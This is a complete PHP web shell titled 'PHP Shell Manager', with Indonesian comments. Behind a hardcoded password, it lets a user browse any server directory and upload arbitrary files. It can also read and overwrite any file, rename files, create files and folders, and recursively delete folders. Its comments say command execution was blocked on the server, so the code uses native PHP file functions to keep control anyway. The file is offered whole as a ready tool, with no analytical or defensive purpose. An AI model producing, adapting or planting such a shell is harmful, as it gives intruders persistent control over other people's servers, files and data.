<?php
// Mulai sesi untuk mempertahankan status login
session_start();

// Kata sandi HARUS diubah
$password = 'new_secret_code';

// Fungsi untuk membersihkan input agar aman untuk ditampilkan di HTML
function clean_html($data) {
    return htmlspecialchars($data, ENT_QUOTES, 'UTF-8');
}

// Fungsi eksekusi perintah DIBUAT DUMMY atau dihilangkan karena DIBLOKIR.
// Kita akan menggunakan fungsi PHP Filesystem murni.

// --- Otentikasi Sesi ---
if (isset($_POST['password']) && $_POST['password'] === $password) {
    $_SESSION['auth'] = true;
}

if (!isset($_SESSION['auth']) || $_SESSION['auth'] !== true) {
    // Tampilan login sederhana
    echo '<!DOCTYPE html><html><head><title>Login</title></head><body><form method="POST">Password: <input type="password" name="password"><input type="submit" value="Login"></form></body></html>';
    exit;
}

// --- Menangani Navigasi Folder & Aksi File ---
$output_message = "";
$current_dir = getcwd();

// Pindah Folder: Menggunakan parameter GET 'dir'
if (isset($_GET['dir'])) {
    $target_dir = $_GET['dir'];
    if (realpath($target_dir) !== false) {
        $current_dir = realpath($target_dir);
    }
}
@chdir($current_dir);
$current_dir = getcwd();

// Pemrosesan aksi POST
if (isset($_POST['command']) && !empty($_POST['command'])) {
    // Karena perintah dinonaktifkan, kita hanya menampilkan pesan
    $output_message = "ERROR: Fungsi eksekusi perintah dinonaktifkan. Command tidak dapat dijalankan.";
} 
elseif (isset($_POST['action'])) {
    $file = isset($_POST['file']) ? $_POST['file'] : '';
    $new_name = isset($_POST['new_name']) ? $_POST['new_name'] : '';
    $content = isset($_POST['content']) ? $_POST['content'] : '';

    switch ($_POST['action']) {
        case 'upload':
            if (isset($_FILES['file_upload'])) {
                $target_file = basename($_FILES['file_upload']['name']);
                if (move_uploaded_file($_FILES['file_upload']['tmp_name'], $target_file)) {
                    $output_message = "File " . clean_html($target_file) . " berhasil diunggah.";
                } else {
                    $output_message = "Gagal mengunggah file. Cek izin tulis direktori.";
                }
            }
            break;
        case 'mkdir':
            // Menggunakan fungsi PHP murni
            if (@mkdir($file)) {
                $output_message = "Folder " . clean_html($file) . " berhasil dibuat.";
            } else {
                $output_message = "Gagal membuat folder " . clean_html($file) . ". Cek izin tulis.";
            }
            break;
        case 'rm':
            // Menggunakan fungsi PHP murni untuk HAPUS REKURSIF
            if (is_dir($file)) {
                // Hapus folder rekursif
                $files_to_delete = new RecursiveIteratorIterator(
                    new RecursiveDirectoryIterator($file, RecursiveDirectoryIterator::SKIP_DOTS),
                    RecursiveIteratorIterator::CHILD_FIRST
                );
                $success = true;
                foreach ($files_to_delete as $fileinfo) {
                    $todo = ($fileinfo->isDir() ? 'rmdir' : 'unlink');
                    if (!@$todo($fileinfo->getRealPath())) { $success = false; }
                }
                if ($success && @rmdir($file)) {
                    $output_message = "Folder " . clean_html($file) . " berhasil dihapus secara rekursif.";
                } else {
                    $output_message = "Gagal menghapus folder " . clean_html($file) . ".";
                }
            } elseif (file_exists($file)) {
                if (@unlink($file)) {
                    $output_message = "File " . clean_html($file) . " berhasil dihapus.";
                } else {
                    $output_message = "Gagal menghapus file " . clean_html($file) . ".";
                }
            } else {
                $output_message = "File/Folder " . clean_html($file) . " tidak ditemukan.";
            }
            break;
        case 'rename':
            // Menggunakan fungsi PHP murni
            if (@rename($file, $new_name)) {
                $output_message = "Berhasil mengganti nama " . clean_html($file) . " menjadi " . clean_html($new_name) . ".";
            } else {
                $output_message = "Gagal mengganti nama.";
            }
            break;
        case 'touch':
            // Menggunakan fungsi PHP murni
            if (@file_put_contents($file, '') !== false) {
                $output_message = "File " . clean_html($file) . " berhasil dibuat.";
            } else {
                $output_message = "Gagal membuat file.";
            }
            break;
        case 'edit_save':
            if (@file_put_contents($file, $content) !== false) {
                $output_message = "File " . clean_html($file) . " berhasil disimpan.";
            } else {
                $output_message = "Gagal menyimpan file. Cek izin tulis.";
            }
            break;
    }
}

// --- Tampilan HTML ---
?>
<!DOCTYPE html>
<html>
<head>
    <title>PHP Shell Manager</title>
    <style>
        body{font-family: monospace; background-color: #212121; color: #4CAF50; padding: 20px;}
        .container{max-width: 1200px; margin: 0 auto; background-color: #1a1a1a; padding: 15px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,255,0,0.3);}
        h1{color: #FFC107; border-bottom: 2px solid #4CAF50; padding-bottom: 10px;}
        .section{margin-bottom: 20px; padding: 10px; border: 1px dashed #616161; border-radius: 5px;}
        input[type="text"], input[type="file"], textarea{width: 100%; padding: 8px; margin-top: 5px; margin-bottom: 10px; border-radius: 4px; border: 1px solid #4CAF50; background-color: #333; color: #fff; box-sizing: border-box;}
        input[type="submit"], button{background-color: #4CAF50; color: black; padding: 8px 15px; border: none; border-radius: 5px; cursor: pointer;}
        a{color: #FFC107; text-decoration: none;}
        a:hover{color: #FFEB3B;}
        pre{background-color: #333; padding: 15px; border-radius: 5px; overflow-x: auto;}
        .error{color: #FF5722;}
        .delete-link { color: #FF5722; cursor: pointer; }
        .delete-link:hover { text-decoration: underline; }
    </style>
    <script>
        // Fungsi JavaScript untuk mengirimkan permintaan POST Delete
        function deleteFile(filePath) {
            // Kita harus menggunakan window.location.href karena skrip ini tidak memiliki form aksi manual
            if (confirm('Apakah Anda yakin ingin menghapus ' + filePath + ' secara permanen?')) {
                var form = document.createElement('form');
                form.method = 'POST';
                form.action = ''; 

                var actionInput = document.createElement('input');
                actionInput.type = 'hidden';
                actionInput.name = 'action';
                actionInput.value = 'rm';
                form.appendChild(actionInput);

                var fileInput = document.createElement('input');
                fileInput.type = 'hidden';
                fileInput.name = 'file';
                fileInput.value = filePath;
                form.appendChild(fileInput);

                document.body.appendChild(form);
                form.submit();
            }
        }
    </script>
</head>
<body>
<div class="container">
    <h1>PHP Shell Manager (Filesystem Only)</h1>
    <h2>Current Dir: <a href="?dir=<?php echo urlencode(dirname($current_dir)); ?>">..</a> / <?php echo clean_html($current_dir); ?></h2>

    <?php if ($output_message): ?>
        <div class="section">
            <pre><?php echo $output_message; ?></pre>
        </div>
    <?php endif; ?>

    <div class="section">
        <h3>Execute Command (Disabled)</h3>
        <form method="POST">
            <input type="text" name="command" placeholder="Enter command (e.g., ls -la, whoami)" disabled>
            <p class="error">Fungsi eksekusi perintah dinonaktifkan di server ini.</p>
        </form>
    </div>

    <div class="section">
        <h3>File Actions (PHP Native)</h3>
        <div style="display: flex; gap: 20px; flex-wrap: wrap;">
            <form method="POST" enctype="multipart/form-data">
                <h4>1. Upload File</h4>
                <input type="hidden" name="action" value="upload">
                <input type="file" name="file_upload">
                <input type="submit" value="Upload">
            </form>
            
            <div>
                <h4>2. Create File & Folder</h4>
                <form method="POST" style="margin-bottom: 5px;">
                    <input type="hidden" name="action" value="touch">
                    <input type="text" name="file" placeholder="File Name">
                    <input type="submit" value="Create File">
                </form>
                <form method="POST">
                    <input type="hidden" name="action" value="mkdir">
                    <input type="text" name="file" placeholder="Folder Name">
                    <input type="submit" value="Create Folder">
                </form>
            </div>

            <form method="POST">
                <h4>3. Rename</h4>
                <input type="hidden" name="action" value="rename">
                <input type="text" name="file" placeholder="Old Name">
                <input type="text" name="new_name" placeholder="New Name">
                <input type="submit" value="Rename">
            </form>
        </div>
    </div>

    <div class="section">
        <h3>File Listing</h3>
        <pre>
<?php 
$all_entries = @scandir('.');
if ($all_entries) {
    // Menggunakan array() untuk kompatibilitas PHP 5.3
    $folders = array();
    $files = array();

    foreach ($all_entries as $entry) {
        if ($entry === '.' || $entry === '..') continue;
        if (@is_dir($entry)) {
            $folders[] = $entry;
        } else {
            $files[] = $entry;
        }
    }
    
    sort($folders);
    sort($files);

    foreach ($folders as $folder) {
        $folder_path = clean_html($folder);
        $full_path = clean_html(realpath($folder));
        echo "[DIR] <a href=\"?dir=" . urlencode(realpath($folder)) . "\">" . $folder_path . "</a> (<a class=\"delete-link\" onclick=\"deleteFile('" . $folder_path . "')\">Delete</a>)<br>";
    }

    foreach ($files as $file) {
        $file_path = clean_html($file);
        $full_path = clean_html(realpath($file));
        echo "[FILE] " . $file_path . " (<a href=\"?dir=" . urlencode($current_dir) . "&edit=" . urlencode($file) . "\">Edit</a> | <a class=\"delete-link\" onclick=\"deleteFile('" . $file_path . "')\">Delete</a>)<br>";
    }
} else {
    echo "Gagal membaca direktori. Cek izin baca direktori.";
}
?>
        </pre>
    </div>

    <?php if (isset($_GET['edit'])): ?>
        <?php $edit_file = $_GET['edit']; ?>
        <div class="section">
            <h3>Edit File: <?php echo clean_html($edit_file); ?></h3>
            <form method="POST">
                <input type="hidden" name="action" value="edit_save">
                <input type="hidden" name="file" value="<?php echo clean_html($edit_file); ?>">
                <textarea name="content" rows="20"><?php echo clean_html(@file_get_contents($edit_file)); ?></textarea>
                <input type="submit" value="Save Changes">
            </form>
        </div>
    <?php endif; ?>

</div>
</body>
</html>
